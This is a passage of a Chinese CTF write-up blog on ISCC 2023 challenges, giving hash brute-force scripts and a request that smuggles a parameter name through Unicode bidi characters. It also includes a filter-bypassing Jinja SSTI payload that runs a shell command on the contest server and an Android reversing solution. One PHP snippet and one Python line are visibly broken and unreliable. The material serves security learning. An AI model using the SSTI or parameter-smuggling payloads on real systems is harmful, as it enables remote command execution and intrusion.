class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;密钥错误!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;        </span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>((<span class="title function_ invoke__">microtime</span>() ^ <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>)) % <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">1e4</span>) + <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">1e4</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>求加密后的a05c53的username，脚本解密，得到user&#x3D;14987637</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hashedNumber</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$targetSuffix</span> = <span class="string">&quot;a05c53&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="variable">$hash</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$hashedNumber</span>);</span><br><span class="line">    <span class="variable">$suffix</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$hash</span>, -<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$sufedNumber</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>脚本爆破sha1和2的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SecurityCheck</span>(<span class="params"><span class="variable">$sha1</span>, <span class="variable">$sha2</span>, <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/^[a-z]+$/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p2</span> = <span class="string">&#x27;/^[A-Z]+$/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$p1</span>, <span class="variable">$sha1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="variable">$p2</span>, <span class="variable">$sha2</span>)) &#123;</span><br><span class="line">        <span class="variable">$sha1</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$sha1</span>);</span><br><span class="line">        <span class="variable">$sha2</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$sha2</span>);</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$user</span>);</span><br><span class="line">        <span class="variable">$crypto</span> = <span class="variable">$sha1</span> ^ <span class="variable">$sha2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="variable">$crypto</span>, <span class="variable">$user</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="string">&#x27;14987637&#x27;</span>; <span class="comment">// 已知 user 值</span></span><br><span class="line"><span class="comment">// 暴力枚举 sha1 和 sha2 的值</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">26</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">26</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span> &lt; <span class="number">26</span>; <span class="variable">$k</span>++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$l</span> = <span class="number">0</span>; <span class="variable">$l</span> &lt; <span class="number">26</span>; <span class="variable">$l</span>++) &#123;</span><br><span class="line">                <span class="variable">$sha1</span> = <span class="title function_ invoke__">chr</span>(<span class="number">97</span> + <span class="variable">$i</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">97</span> + <span class="variable">$j</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">97</span> + <span class="variable">$k</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">97</span> + <span class="variable">$l</span>); <span class="comment">// 生成 sha1 值</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="variable">$m</span> = <span class="number">0</span>; <span class="variable">$m</span> &lt; <span class="number">26</span>; <span class="variable">$m</span>++) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="variable">$n</span> = <span class="number">0</span>; <span class="variable">$n</span> &lt; <span class="number">26</span>; <span class="variable">$n</span>++) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="variable">$o</span> = <span class="number">0</span>; <span class="variable">$o</span> &lt; <span class="number">26</span>; <span class="variable">$o</span>++) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="variable">$p</span> = <span class="number">0</span>; <span class="variable">$p</span> &lt; <span class="number">26</span>; <span class="variable">$p</span>++) &#123;</span><br><span class="line">                                <span class="variable">$sha2</span> = <span class="title function_ invoke__">chr</span>(<span class="number">65</span> + <span class="variable">$m</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">65</span> + <span class="variable">$n</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">65</span> + <span class="variable">$o</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">65</span> + <span class="variable">$p</span>); <span class="comment">// 生成 sha2 值</span></span><br><span class="line">                                [<span class="variable">$crypto</span>, <span class="variable">$user</span>] = <span class="title function_ invoke__">SecurityCheck</span>(<span class="variable">$sha1</span>, <span class="variable">$sha2</span>, <span class="variable">$user</span>); <span class="comment">// 加密</span></span><br><span class="line">                                <span class="keyword">if</span> ((<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$crypto</span>), -<span class="number">6</span>, <span class="number">6</span>) === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$user</span>), -<span class="number">6</span>, <span class="number">6</span>)) &amp;&amp; (<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$user</span>), -<span class="number">6</span>, <span class="number">6</span>)) === <span class="string">&#x27;a05c53&#x27;</span>) &#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;sha1: <span class="subst">$sha1</span>, sha2: <span class="subst">$sha2</span>\n&quot;</span>; <span class="comment">// 输出符合条件的 sha1 和 sha2 值</span></span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;flag\n&quot;</span>; <span class="comment">// 输出 flag</span></span><br><span class="line">                                    <span class="keyword">exit</span>(); <span class="comment">// 结束程序</span></span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到sha1 &#x3D; aaad sha2 &#x3D;JEJX</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524205824468.png" alt="image-20230524205824468"></p>
<p>然后枚举爆破pass，运行得到 HzjkNOTHARD</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ef my_hash_code(s):</span><br><span class="line">   h = <span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">       h = ((h * <span class="number">40</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>) + <span class="built_in">ord</span>(c)</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">abs</span>(int40(h))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int40</span>(<span class="params">n</span>):</span><br><span class="line">   <span class="keyword">if</span> n &gt;&gt; <span class="number">39</span>:</span><br><span class="line">       n = ~((n &amp; <span class="number">0xFFFFFFFFFFFFFFF</span>) - <span class="number">1</span>)</span><br><span class="line">       <span class="keyword">return</span> -n</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> n</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_password</span>(<span class="params">password</span>):</span><br><span class="line">   <span class="keyword">return</span> my_hash_code(password) == my_hash_code(<span class="string">&quot;ISCCNOTHARD&quot;</span>) <span class="keyword">and</span> <span class="string">&quot;ISCC&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> itertools.product(<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>, repeat=<span class="number">4</span>):</span><br><span class="line">   password = <span class="string">&quot;&quot;</span>.join(password) + <span class="string">&quot;NOTHARD&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(password)</span><br><span class="line">   <span class="keyword">if</span> check_password(password):</span><br><span class="line">       <span class="built_in">print</span>(password)</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;ok mima&quot;</span>)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现不能直接输出sha2，将sha2复制到txt上，然后010打开，发现sha2为一段乱码，将其16进制复制出</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-23%20194043.png"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524210443219.png" alt="image-20230524210443219"></p>
<p>然后发送请求&#x2F;?password&#x3D;HzjkNOTHARD&amp;password2&#x3D;6&amp;username&#x3D;14987637&amp;sha1&#x3D;aaad&amp;%E2%80%AE%E2%81%A6%2F%2F%73%68%61%32%E2%81%A9%E2%81%A6%73%68%61%32&#x3D;JEJX得到flag &#x3D; ISCC{NbynkooTT0mKyDxzwpFNSTrdHESj8iEi}</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230524210615676.png" alt="image-20230524210615676"></p>
<h3 id="chatgaaa"><a href="#chatgaaa" class="headerlink" title="chatgaaa"></a>chatgaaa</h3><p>查看前端代码，发现是一个ssti模块注入，过滤了一下字符_、’、+、*、global等</p>
<p>首先，构造下划线</p>
<p>然后构造_globals_</p>
<p>查看全局</p>
<p>再查看当前目录</p>
<p>读取flllaag.txt</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethex</span>(<span class="params">s1</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line">        s += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;\\x&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;&#123;% print(lipsum|attr(&quot;&#x27;</span> + gethex(<span class="string">&quot;__globals__&quot;</span>) + <span class="string">&#x27;&quot;)|attr(&quot;&#x27;</span> + gethex(<span class="string">&quot;__getitem__&quot;</span>) + <span class="string">&#x27;&quot;)(&quot;os&quot;)|attr(&quot;&#x27;</span> +gethex(<span class="string">&quot;popen&quot;</span>) +<span class="string">&#x27;&quot;)(&quot;&#x27;</span> + gethex(<span class="string">&quot;cat fll*&quot;</span>) + <span class="string">&#x27;&quot;)|attr(&quot;&#x27;</span> +gethex(<span class="string">&quot;read&quot;</span>) + <span class="string">&#x27;&quot;)() ) %&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://47.94.14.162:10006&quot;&quot;&quot;</span></span><br><span class="line">result = requests.post(url,data=&#123;<span class="string">&quot;ask&quot;</span>:payload2&#125;).text</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>运行结果：                          </p>
<p>构造下划线，然后构造_globals_，查看全局，再查看当前目录，读取flllaag.txt，得到flag</p>
<h2 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h2><h3 id="NOJAVA"><a href="#NOJAVA" class="headerlink" title="NOJAVA"></a>NOJAVA</h3><p>jadx打开，搜iscc文本，代码，快速找到关键代码块<img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230523001140363.png" alt="image-20230523001140363"></p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230523001319060.png" alt="image-20230523001319060"></p>
<p>编写解题脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">text=<span class="string">&#x27;jejZfYjYjijeeejZffejYiYi&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(i), <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> text)</span><br><span class="line"></span><br><span class="line">a = [binary[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">\<span class="comment"># print(a)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> i==<span class="string">&quot;1001&quot;</span>:</span><br><span class="line"></span><br><span class="line"> payload+=<span class="string">&quot;10&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">elif</span> i==<span class="string">&quot;0110&quot;</span>:</span><br><span class="line"></span><br><span class="line"> payload+=<span class="string">&quot;01&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">elif</span> i==<span class="string">&quot;1010&quot;</span>:</span><br><span class="line"></span><br><span class="line"> payload+=<span class="string">&quot;11&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">elif</span> i==<span class="string">&quot;0101&quot;</span>:</span><br><span class="line"></span><br><span class="line"> payload+=<span class="string">&quot;00&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;waaa&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(payload[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload), <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>运行得到flag  {tsRrvtDsUG&amp;&amp;}</p>
<p><img src="https://jundex-1318686741.cos.ap-shanghai.myqcloud.com/blong/image-20230523001728065.png" alt="image-20230523001728065"></p>

                
            </div>
            <hr/>

            



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/07/16/BUUCTF%E7%AC%94%E8%AE%B0/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/medias/featureimages/0.jpg" class="responsive-img" alt="">
                        
                        <span class="card-title"></span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Jundex
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/05/16/2022%20ISCC/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/medias/featureimages/8.jpg" class="responsive-img" alt="2022 ISCC">
                        
                        <span class="card-title">2022 ISCC</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-16
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Jundex
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%AD%A6%E4%B9%A0/">
                        <span class="chip bg-color">学习</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/codeBlock/codeBlockFuction.js"></script>



<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>



<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>



    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2023</span>
            
            <a href="/about" target="_blank">Jundex</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
                <span id="icp"><img src="https://cdn.jsdelivr.net/gh/Jundexu/Jundexu.github.io/medias/icp.png"
                                    style="vertical-align: text-bottom;"/>
                <a href="/null" target="_blank"></a>
            </span>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Jundexu" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2420956310@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2420956310" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2420956310" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
